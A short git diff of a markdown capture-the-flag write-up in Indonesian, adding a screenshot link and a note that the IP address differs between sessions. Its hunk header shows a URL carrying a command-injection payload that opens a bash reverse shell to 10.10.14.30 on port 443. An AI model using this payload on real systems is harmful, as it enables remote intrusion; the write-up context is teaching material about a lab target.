@@ -47,6 +47,8 @@ http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443
 ```
 ![image](https://user-images.githubusercontent.com/92077284/213357672-62b90aeb-1762-418d-9e22-edc9fa001afb.png)  
 lalu aktivitas akan terekam pada terminal yang tadi  
+![image](https://user-images.githubusercontent.com/92077284/213358242-9cd66e8b-48e6-4f71-a2b9-86420ffc9b8b.png)  
+_Note : IP berbeda karena WU dibuat pada hari berbeda_  
 
 
 
